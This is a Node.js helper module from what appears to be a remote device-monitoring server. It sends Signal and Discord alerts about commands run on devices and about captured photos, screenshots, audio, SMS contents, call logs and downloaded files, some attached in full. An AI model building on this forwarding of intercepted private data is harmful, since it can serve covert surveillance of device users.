// helpers/device-signal-notify.js — device-scoped Signal/Discord notifications.
//
// A HELPER module, not a route module: it registers nothing. server.js owns the
// call sites (routes/device-commands-and-enrollment, helpers/finalize-audio-session,
// sockets/connection).
//
//   signalFeature   export   high-impact command executed against a device
//   signalData      export   captured-data notification (photo/screenshot/audio/sms/calls/file)
//
// The block's own position (L227 at plan time) sits BELOW its deps: signalSend
// (L593), discordSend (L594), getDiscordWebhook (L595), notifyAdminForDevice
// (L598) and deviceAlertTarget (L603) are bootstrap `var` assignments after the
// block, so the require was RELOCATED to X >= L604 (fresh plan window
// L604..L3581; earliest consumer routes/device-commands-and-enrollment L3582).
// All deps are initialised above the wiring line and are never reassigned —
// passed BY VALUE (no getters, no refs object). CMD_META is a stable const
// (L155). getDiscordWebhook is a plain function dep here (CALLED by signalData),
// which is exactly why relocation is the fix: verify-move's getter canon has no
// called-thunk rewrite.
//
// No relative require to rebase: the block contains none (measured, not assumed).

module.exports = ({ CMD_META, deviceAlertTarget, discordSend, getDiscordWebhook, notifyAdminForDevice, signalSend }) => {

function signalFeature(command, body, device, req) {
  const meta = CMD_META[command];
  if (!meta?.notify) return;
  const xff  = req.headers['x-forwarded-for'];
  const ip   = (xff ? xff.split(',')[0].trim() : null) || req.ip || req.socket?.remoteAddress || 'unknown';
  const user = req.session?.username || 'unknown';
  const deviceLabel = device ? `${device.name} • ${device.model}` : 'Unknown Device';
  let msg = `${meta.label}\nDevice: ${deviceLabel}\nUser: ${user}  IP: ${ip}`;
  if (command === 'show_message' && body.message) msg += `\nMessage: ${String(body.message).slice(0, 512)}`;
  notifyAdminForDevice(msg, device?.id || null);
}

async function signalData(type, deviceLabel, payload, deviceId) {
  try {
    if (type === 'photo' || type === 'screencapture') {
      const title = type === 'screencapture' ? '🖥️ Screenshot' : '📷 Photo';
      // Signal supports image attachments; Discord receives text only (no binary attach).
      // Suppressed for public non-hybrid devices (photo/file captures are routine account alerts).
      const target = (await deviceAlertTarget(deviceId));
      if (target.suppress) return;
      await signalSend(`${title}\nDevice: ${deviceLabel}`,
        [`data:image/jpeg;base64,${payload.base64}`],
        target.group || null);
      const discordUrl = (await getDiscordWebhook());
      if (discordUrl) await discordSend(`${title}\nDevice: ${deviceLabel}`, discordUrl);

    } else if (type === 'audio') {
      const kb = (Buffer.from(payload.base64, 'base64').length / 1024).toFixed(1);
      await notifyAdminForDevice(`🎙️ Audio Recording\nDevice: ${deviceLabel}  Size: ${kb} KB`, deviceId);

    } else if (type === 'sms') {
      const msgs = (payload.messages || []).slice(0, 50);
      const text = msgs.map(m =>
        `[${m.type === 1 ? 'IN' : 'OUT'}] ${m.address || '?'}  ${new Date(+m.date).toLocaleString()}\n${(m.body || '').slice(0, 300)}`
      ).join('\n─────\n') || '(no messages)';
      await notifyAdminForDevice(`💬 SMS (${msgs.length})\nDevice: ${deviceLabel}\n\n${text}`.slice(0, 4000), deviceId);

    } else if (type === 'calls') {
      const TYPE_LABEL = { 1: 'IN', 2: 'OUT', 3: 'MISSED' };
      const calls = (payload.calls || []).slice(0, 100);
      const text  = calls.map(c =>
        `[${TYPE_LABEL[c.type] || c.type}] ${c.number || '?'}  ${c.duration ?? '?'}s  ${new Date(+c.date).toLocaleString()}`
      ).join('\n') || '(no calls)';
      await notifyAdminForDevice(`📞 Calls (${calls.length})\nDevice: ${deviceLabel}\n\n${text}`.slice(0, 4000), deviceId);

    } else if (type === 'file') {
      const buf      = Buffer.from(payload.base64, 'base64');
      const sizeStr  = `${(buf.length / 1024).toFixed(1)} KB`;
      const attachments = buf.length <= 8 * 1024 * 1024
        ? [`data:application/octet-stream;base64,${payload.base64}`] : [];
      const target = (await deviceAlertTarget(deviceId));
      if (target.suppress) return;
      await signalSend(
        `📥 File Downloaded\nDevice: ${deviceLabel}\nPath: ${String(payload.path).slice(0, 300)}\nSize: ${sizeStr}`,
        attachments,
        target.group || null
      );
      const discordUrl = (await getDiscordWebhook());
      if (discordUrl) await discordSend(
        `📥 File Downloaded\nDevice: ${deviceLabel}\nPath: ${String(payload.path).slice(0, 300)}\nSize: ${sizeStr}`,
        discordUrl
      );
    }
  } catch (e) { console.error('signalData error:', e.message); }
}

return { signalData, signalFeature };

};
